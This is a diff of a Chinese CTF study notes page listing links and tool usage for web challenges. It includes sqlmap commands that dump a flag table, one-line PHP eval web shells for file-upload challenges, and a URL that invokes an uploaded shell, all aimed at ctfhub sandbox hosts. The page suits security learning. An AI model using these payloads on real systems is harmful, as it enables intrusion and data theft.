@@ -5,12 +5,15 @@
 	- [俺自己的 CTF 常用工具使用 & 初学经验整理](https://zhangmaimai.com/2021/10/30/max-ctf-tools-and-exp/)
 	- [2020年收集的渗透测试进阶学习资料](https://www.cnhackteam.org/topic/1001/?btwaf=43553764)
 	- [又一个wiki](https://ctf-wiki.org/)
+	- [Security-Data-Analysis-and-Visualization](https://github.com/404notf0und/Security-Data-Analysis-and-Visualization#Web%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%A4%A7%E7%BB%BC%E5%90%88)
 - 工具类型的网站
 	- [CTFTools](https://ctftools.com/down/)
 	- [CTF编码](http://www.hiencode.com/)
 	- [Personal CTF Toolkit](https://github.com/Harmoc/CTFTools)
 	- [渗透师导航](https://www.shentoushi.top/knowledge)
+	- [[常见web系统默认口令总结]]
 - 习题
+  collapsed:: true
 	- [Writeups](https://github.com/susers/Writeups)
 	- [全国大学生信息安全竞赛真题（CTF）](https://blog.csdn.net/Toufahaizai/article/details/89002051)
 	- [Hacker Game 2021 Writeups](https://github.com/USTC-Hackergame/hackergame2021-writeups)
@@ -20,11 +23,124 @@
 	- [CTF-Site](https://github.com/myndtt/CTF-Site)
 	- [合天网安实验室](https://www.hetianlab.com/pages/CTFLaboratory.jsp)
 - 博客
+  collapsed:: true
 	- [BACKUP](https://4hou.win/wordpress/?cat=3388)
-- 软件
-	- [[VMWare]]
-	- [[Burpsuite Pro 2022.2.2]]
-		- [Burp Suite 使用介绍](http://drops.xmd5.com/static/drops/tools-1548.html)
--
+- 工具以及思路
+	- 虚拟机
+	  collapsed:: true
+		- [[VMWare]]
+	- Web
+		- > pip config set global.index-url https://mirrors.aliyun.com/pypi/simple
+		- 扫描工具
+		  collapsed:: true
+			- [wappalyzer](https://www.wappalyzer.com/installed?utm_source=installed&utm_medium=extension&utm_campaign=wappalyzer) 网站信息扫描
+			  id:: 62aae34b-60dd-4818-90e4-ae6b89c93527
+			- [cansina](https://github.com/deibit/cansina) 目录扫描
+				- ```shell
+				  安装依赖
+				  pip install -r requirements.txt
+				  扫描
+				  python3 cansina.py -u <site_url> -p <payload_file>
+				  ```
+			- [dirsearch](https://github.com/maurosoria/dirsearch) 目录扫描
+				- ```shell
+				  py dirsearch.py -u http://challenge-f0c5939453483692.sandbox.ctfhub.com:10800/
+				  ```
+		- 读取工具
+		  collapsed:: true
+			- [GitHack](https://github.com/lijiejie/GitHack) git泄露读取文件
+			  collapsed:: true
+				- ```shell
+				  python GitHack.py http://www.openssl.org/.git/
+				  ```
+				- git常用语句
+					- 查看日志
+					  collapsed:: true
+						- ```shell
+						  git log
+						  ```
+					- 查看commit 内容
+						- ```xshell
+						  git diff commitID
+						  ```
+					- 查看stash
+					  collapsed:: true
+						- ```shell
+						  git stash list
+						  ```
+					- 出stash
+					  collapsed:: true
+						- ```shell
+						  git stash pop
+						  ```
+					- 查看stash的hash文件
+					  collapsed:: true
+						- ```shell
+						  cat .git/refs/stash
+						  ```
+			- [dvcs-ripper](https://github.com/kost/dvcs-ripper)
+			  collapsed:: true
+				- docker docker环境会报错
+				  collapsed:: true
+					- ```shell
+					  docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-svn.pl -v    -u  http://challenge-b462cb7bd1c09880.sandbox.ctfhub.com:10800
+					  ```
+				-
+		- SQL注入
+		  collapsed:: true
+			- [sqlmap](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md)
+				- 需要安装 [visual-cpp-build-tools](https://visualstudio.microsoft.com/zh-hans/visual-cpp-build-tools/)
+					- ![image.png](../assets/image_1655354940503_0.png)
+				- ```shell
+				  git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+				  ```
+				-
+				- 列出表名
+					- ```shell
+					  python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 --tables
+					  ```
+				- 列出列名
+					- ```shell
+					  python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag --columns
+					  ```
+				- 查数据
+					- ```shell
+					  python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag -C flag --dump
+					  ```
+		- 文件上传
+		  collapsed:: true
+			- 1.确定环境
+			  collapsed:: true
+				- ((62aae34b-60dd-4818-90e4-ae6b89c93527))
+			- 2.上传对应木马
+				- PHP
+					- ```PHP
+					  <?php eval(@$_POST['a']); ?>
+					  ```
+					- ```PHP
+					  <?php eval(@$_GET['a']); ?>
+					  ```
+			- 3.访问接口
+				- ```curl
+				  http://challenge-15ae0dbdc51ad51b.sandbox.ctfhub.com:10800/upload/sad.php?a=phpinfo();
+				  ```
+		- 抓包工具
+		  collapsed:: true
+			- [[Burpsuite Pro 2022.2.2]]
+			  collapsed:: true
+				- [Burp Suite 使用介绍](http://drops.xmd5.com/static/drops/tools-1548.html)
+		- 网站管理工具
+			- [AntSword](https://github.com/AntSwordProject/AntSword-Loader)
+			-
+		-
+	- Wisc
+	  collapsed:: true
+		- 图片隐写
+		  collapsed:: true
+			- [BlindWaterMark](https://github.com/chishaxie/BlindWaterMark)
+			  collapsed:: true
+				- 盲水印 by python
+- 字典
+	- [fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)
 -
 -
